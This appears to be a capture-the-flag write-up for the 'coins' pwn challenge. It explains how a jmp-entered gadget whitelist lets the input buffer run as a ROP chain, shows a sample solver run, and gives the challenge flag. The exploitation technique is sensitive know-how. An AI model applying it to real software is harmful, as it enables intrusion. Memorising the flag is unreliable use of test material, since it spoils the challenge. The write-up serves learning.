# coins

- Category: pwn
- Author: fslaktern

"Wanna see my coin collection? You see, I'm somewhat of a numismatist myself. I'll give you a flag if you can pay for it in my kind of money."

Hand-written assembly (`coins.asm`). It hands you both a PIE leak and the exact address you need to reach, then makes you build the chain out of a 33-address whitelist of "coin" gadgets — every one of which is a single `adc` or `sub`.

### Solution:

##### 1. It tells you where to go, and mmaps the target itself

```
starting balance:	0x7f54cb6c2000
flag price:		[your_balance] + 0x9659f

go big?
> 
```

`gr` picks a random offset with `rdrand`, maps 1 MB of RW memory at a fixed address, copies a 0x28-byte `win` stub to `base + rand`, then `mprotect`s the region **R-X**. The two printed values are the image base and `win_addr - base`, so the destination is fully known but re-randomised every connection. The stub is a flag printer:

```asm
mov  rbx, "/flag"      ; note: /flag, not /flag.txt
push rbx
mov  rdi, rsp
xor  esi, esi
mov  eax, 2            ; SYS_open
syscall
mov  esi, eax
push 1 ; pop rdi       ; stdout
xor  edx, edx
mov  r10b, 0x25
mov  eax, 0x28         ; SYS_sendfile
syscall
```

##### 2. The buffer *is* the ROP chain

`i` does `sub rsp,0xf8` then `read(0, rsp, 0xf8)` — it cannot overflow. But the validator that follows is reached by `jmp`, never `call`, so `rsp` is still sitting on our buffer the whole time:

```asm
cg:  cmp  rdi,rdx          ; walked past the end?
     ja   cd
     mov  rcx,QWORD PTR [rdi]
     lea  rax,[rip+...]    ; croeseid, daric, siglos, ... 33 of them
     cmp  rcx,rax
     je   cn               ; matched a coin -> next qword
     ...
     jmp  e                ; anything else -> exit(1)
cn:  add  rdi,0x8
     jmp  cg
cd:  lea  rax,[rip+0x13c]  ; shilling
     cmp  QWORD PTR [rdi-0x8],rax
     jne  e                ; last qword must be shilling
     stc                   ; carry set for the first adc
glhf: ret                  ; pops chain[0] off our own buffer
```

So every qword must be one of the 33 whitelisted gadget addresses, the last must be `shilling`, and `glhf`'s `ret` then executes them in order. `pq` also explicitly `xor`s `r8`–`r15` to zero right before the read, which is what makes the arithmetic below well-defined.

![Flow of coins: gr leaks the image base and win offset and mprotects the stub R-X, pq zeroes r8-r15, i reads 0xf8 bytes, cg validates each qword against the 33 coin addresses looping through cn, cd requires the last qword to be shilling and sets carry, glhf rets into our buffer which builds r8 and jmps to the win stub; every rejection path falls to exit](callgraph.png)

##### 3. Every coin is one arithmetic instruction

```asm
croeseid:  adc r8,0x1        aureus:  adc r8,0x100     dinar:  adc r8,0x10000
daric:     adc r9,0x2        solidus: adc r9,0x200     real:   adc r9,0x20000
siglos:    adc r10,0x4       ...                       dirham: adc r8,0x20000
...                                                    scudo:  adc r8,0x40000
loonie:    sub r8,r9         krugerrand: sub r8,r10     thaler: adc r8,0x80000
drachma:   sub r8,r12        penny: sub r8,r13   nickel: sub r8,r14   dime: sub r8,r15

quarter:   lea rax,[rip+0x532]   ; rax = base + 0x1a26
cent:      add rax,r8
shilling:  jmp rax
```

`quarter → cent → shilling` is the only way to leave the whitelist, so the whole challenge reduces to one equation:

```
r8 = flag_price_offset - 0x1a26
```

##### 4. Solving for r8 with add-only registers

The catch is which bits live where. `r8` can be incremented directly at bits 0, 8 and 16–19; every other bit (1–7, 9–15) is reachable only in `r9`–`r15`, and those can only be **subtracted** from `r8`, never added. So the target is written as a difference:

```
r8 = A - S      A from r8's own increments {1, 0x100, 0x10000, 0x20000, 0x40000, 0x80000}
                S built in r9..r15, then subtracted register by register
```

`solve.py` brute-forces the six `A` coefficients and greedily decomposes `S = A - T` across the other registers, keeping any solution inside the 31-qword budget (`0xf8 / 8`). Two details matter: `cd`'s `stc` means the **first** `adc` carries in an extra 1, and `r11` is skipped entirely because `i` sets it to the input length rather than leaving it zero. Ordering all the `adc`s before all the `sub`s keeps the carry flag out of the way for the rest.

Typical solutions land at 17–23 qwords, re-solved per connection since the offset is fresh each time:

```
$ ./solve.py coins-ad93defde5f3.chall.nnsc.tf:1337
[!] base=0x7fc9a3046000 price=+0xe2c96 r8 target=0xe1270 chain=23 qwords
NNS{wH0_co1NeD_7he_73rm_NuM15m4t1C5?}
```

Full script: [solve.py](solve.py)

**Flag:** `NNS{wH0_co1NeD_7he_73rm_NuM15m4t1C5?}`

### Takeaways

- When a validator is entered by `jmp` rather than `call`, the stack pointer never moved — the input buffer it just finished checking is still what the next `ret` will execute. A gadget whitelist does not help if the whitelist is reachable as a chain.
- A restricted gadget set is worth modelling as an arithmetic reachability problem rather than searched by hand: note which bits each register can contribute and in which direction, then let a solver find `A - S`. Add-only registers plus a single `sub` still span everything, just not the way you would write it by hand.
- Check the flag path's *own* syscalls before assuming a silent run failed — this stub opens `/flag`, not `/flag.txt`, so a local test with the wrong filename looks identical to a broken chain.
